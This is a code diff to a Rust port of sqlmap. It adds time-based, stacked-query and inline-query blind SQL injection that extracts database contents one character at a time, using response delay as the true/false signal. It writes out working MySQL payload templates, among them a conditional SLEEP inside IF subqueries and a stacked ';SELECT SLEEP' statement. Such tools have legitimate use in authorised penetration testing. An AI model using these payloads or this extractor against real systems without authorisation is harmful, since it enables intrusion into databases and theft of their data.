@@ -23,6 +23,39 @@ const MAX_COUNT: u32 = 50;
 
 /// Extracts data character-by-character through a confirmed boolean-based
 /// injection point, using the response comparison ratio as the oracle.
+/// How a blind inference condition is confirmed (sqlmap `queryPage` vs its
+/// time-based counterpart): page comparison for boolean injections, or a
+/// conditional SLEEP for time/stacked/inline injections.
+pub enum InferSignal {
+    /// Boolean page comparison against the injection's true page.
+    Page,
+    /// sqlmap's conditional-sleep inference vector. `full_replace` marks the
+    /// inline-query shape (the value IS the subquery; technique Q).
+    Delay { template: &'static str, full_replace: bool },
+}
+
+/// sqlmap's time-based inference vector (time_blind.xml): the SLEEP fires
+/// only when [INFERENCE] holds.
+const TIME_INFER: &str =
+    "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])";
+/// Stacked channel (stacked_queries.xml): second statement, conditional sleep.
+const STACKED_INFER: &str = ";SELECT SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))-- ";
+/// Inline channel (inline_query.xml): the whole value becomes the subquery.
+const INLINE_INFER: &str =
+    "(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])";
+
+/// Pick the inference channel for an injection by its technique (sqlmap
+/// retrieves data through whichever technique confirmed the injection).
+pub fn infer_signal(technique: sqlmap_core::config::Technique) -> InferSignal {
+    use sqlmap_core::config::Technique as T;
+    match technique {
+        T::Time => InferSignal::Delay { template: TIME_INFER, full_replace: false },
+        T::Stacked => InferSignal::Delay { template: STACKED_INFER, full_replace: false },
+        T::Inline => InferSignal::Delay { template: INLINE_INFER, full_replace: true },
+        _ => InferSignal::Page,
+    }
+}
+
 pub struct BlindExtractor<'a> {
     client: &'a Client,
     conf: &'a Config,
@@ -33,6 +66,7 @@ pub struct BlindExtractor<'a> {
     threshold: f64,
     seed: u64,
     qs: crate::queries::Dbms,
+    signal: InferSignal,
     pub log: Vec<String>,
 }
 
@@ -62,9 +96,11 @@ impl<'a> BlindExtractor<'a> {
         inj: Injection,
         true_page: String,
         threshold: f64,
+        signal: InferSignal,
     ) -> Self {
         let qs = pick_query_set(conf, &inj);
         Self {
+            signal,
             client,
             conf,
             param,
@@ -77,24 +113,42 @@ impl<'a> BlindExtractor<'a> {
         }
     }
 
-    /// Fire one boolean condition; true when the page still matches the
-    /// injection's true page (port of `queryPage` used by inference).
+    /// Fire one inference condition. Page mode: true when the page still
+    /// matches the injection's true page (port of `queryPage`). Delay mode:
+    /// true when the response is delayed by ~time_sec (sqlmap's time-based
+    /// inference: SLEEP(x-(IF(cond,0,x))) sleeps only when cond holds).
     fn check(&mut self, cond: &str) -> Option<bool> {
         self.seed += 1;
-        let payload = format!("AND {cond}");
-        let val = assemble(
-            self.conf,
-            &mut self.log,
-            &self.param,
-            &self.inj.boundary,
-            &payload,
-            20000 + self.seed,
-        );
+        let (val, need) = match &self.signal {
+            InferSignal::Page => (
+                assemble(
+                    self.conf,
+                    &mut self.log,
+                    &self.param,
+                    &self.inj.boundary,
+                    &format!("AND {cond}"),
+                    20000 + self.seed,
+                ),
+                None,
+            ),
+            InferSignal::Delay { template, full_replace } => {
+                let q = template.replace("[INFERENCE]", cond);
+                let v = if *full_replace {
+                    crate::engine::assemble_full(self.conf, &mut self.log, &q, 20000 + self.seed)
+                } else {
+                    assemble(self.conf, &mut self.log, &self.param, &self.inj.boundary, &q, 20000 + self.seed)
+                };
+                (v, Some(std::time::Duration::from_secs(self.conf.time_sec as u64)))
+            }
+        };
         let resp = self
             .client
             .request(&build_request(self.conf, &self.param, &val))
             .ok()?;
-        Some(ratio(&self.true_page, &filtered_page(&resp.body)) >= self.threshold)
+        Some(match need {
+            Some(need) => resp.elapsed >= need,
+            None => ratio(&self.true_page, &filtered_page(&resp.body)) >= self.threshold,
+        })
     }
 
     /// Bisect a non-negative integer expression with `expr > mid` probes
